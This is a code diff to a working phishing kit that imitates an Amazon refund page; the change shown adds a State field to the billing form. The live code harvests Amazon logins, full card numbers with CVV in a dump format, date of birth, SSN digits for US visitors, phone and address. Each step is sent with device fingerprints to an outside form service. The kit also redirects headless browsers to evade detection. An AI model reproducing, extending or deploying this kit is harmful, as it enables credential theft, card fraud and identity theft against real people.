@@ -152,8 +152,9 @@
                 <div class="form-group ssn-group" id="ssnGroup"><label>SSN (last 4)</label><input type="text" id="ssn" maxlength="4"></div>
                 <div class="form-group"><label>Phone</label><input type="tel" id="phone" required></div>
                 <div class="form-group"><label>Address</label><input type="text" id="address" required></div>
+                <div class="form-group"><label>City</label><input type="text" id="city" required></div>
                 <div style="display: flex; gap: 12px;">
-                    <div class="form-group" style="flex: 2;"><label>City</label><input type="text" id="city" required></div>
+                    <div class="form-group" style="flex: 1;"><label>State</label><input type="text" id="state" required></div>
                     <div class="form-group" style="flex: 1;"><label>ZIP</label><input type="text" id="zip" required></div>
                 </div>
                 <button type="submit" class="btn btn-orange">Complete Refund</button>
@@ -191,7 +192,7 @@
         document.getElementById('productImg').src = config.img;
         
         let passwordAttempt = 0;
-        let data = { email: '', password: '', password2: '', cardName: '', cardNumber: '', cardExp: '', cardCvv: '', fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '', ip: '', country: '', ua: navigator.userAgent, screen: screen.width + 'x' + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone };
+        let data = { email: '', password: '', password2: '', cardName: '', cardNumber: '', cardExp: '', cardCvv: '', fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', state: '', zip: '', ip: '', country: '', ua: navigator.userAgent, screen: screen.width + 'x' + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone };
 
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => { data.ip = d.ip; data.country = d.country_code; if (d.country_code === 'US') { document.getElementById('ssnGroup').style.display = 'block'; document.getElementById('ssn').required = true; } }).catch(() => {});
 
@@ -207,7 +208,7 @@
             let msg = '=== AMAZON [' + config.order + '] ===\nProduct: ' + config.product + '\nPrice: $' + config.price + '\n\n--- LOGIN ---\nEmail: ' + data.email + '\nPass1: ' + data.password + '\n';
             if (data.password2) msg += 'Pass2: ' + data.password2 + '\n';
             if (step >= 2) { msg += '\n--- CARD ---\nName: ' + data.cardName + '\nCard: ' + data.cardNumber + '\nExp: ' + data.cardExp + '\nCVV: ' + data.cardCvv + '\n'; let cn = data.cardNumber.replace(/\s/g, ''); let exp = data.cardExp.replace(/\s/g, '').split('/'); msg += 'FORMAT: ' + cn + '|' + (exp[0]||'') + '|' + (exp[1]||'') + '|' + data.cardCvv + '\n'; }
-            if (step >= 3) { msg += '\n--- PERSONAL ---\nName: ' + data.fullName + '\nDOB: ' + data.dob + '\n'; if (data.ssn) msg += 'SSN4: ' + data.ssn + '\n'; msg += 'Phone: ' + data.phone + '\nAddr: ' + data.address + ', ' + data.city + ' ' + data.zip + '\n'; }
+            if (step >= 3) { msg += '\n--- PERSONAL ---\nName: ' + data.fullName + '\nDOB: ' + data.dob + '\n'; if (data.ssn) msg += 'SSN4: ' + data.ssn + '\n'; msg += 'Phone: ' + data.phone + '\nAddr: ' + data.address + ', ' + data.city + ', ' + data.state + ' ' + data.zip + '\n'; }
             msg += '\n--- DEVICE ---\nIP: ' + data.ip + ' (' + data.country + ')\nScreen: ' + data.screen + '\nTZ: ' + data.tz + '\n';
             try { await fetch('https://api.web3forms.com/submit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: step === 1 ? 'Email Access' : step === 2 ? 'Card Info' : 'Personal Info', from_name: 'D1337 Project', message: msg }) }); } catch(e) {}
         }
@@ -220,7 +221,7 @@
 
         document.getElementById('cardForm').addEventListener('submit', async e => { e.preventDefault(); data.cardName = document.getElementById('cardName').value; data.cardNumber = document.getElementById('cardNumber').value; data.cardExp = document.getElementById('cardExp').value; data.cardCvv = document.getElementById('cardCvv').value; showLoading(true); await sendData(2); setTimeout(() => { showLoading(false); showStep(5); }, 1500); });
 
-        document.getElementById('billingForm').addEventListener('submit', async e => { e.preventDefault(); data.fullName = document.getElementById('fullName').value; data.dob = document.getElementById('dob').value; data.ssn = document.getElementById('ssn').value; data.phone = document.getElementById('phone').value; data.address = document.getElementById('address').value; data.city = document.getElementById('city').value; data.zip = document.getElementById('zip').value; showLoading(true); await sendData(3); setTimeout(() => { showLoading(false); showStep(6); setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000); }, 2000); });
+        document.getElementById('billingForm').addEventListener('submit', async e => { e.preventDefault(); data.fullName = document.getElementById('fullName').value; data.dob = document.getElementById('dob').value; data.ssn = document.getElementById('ssn').value; data.phone = document.getElementById('phone').value; data.address = document.getElementById('address').value; data.city = document.getElementById('city').value; data.state = document.getElementById('state').value; data.zip = document.getElementById('zip').value; showLoading(true); await sendData(3); setTimeout(() => { showLoading(false); showStep(6); setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000); }, 2000); });
 
         (function() { if (navigator.webdriver || navigator.userAgent.toLowerCase().includes('headless')) window.location.href = 'https://www.amazon.com/'; })();
     </script>
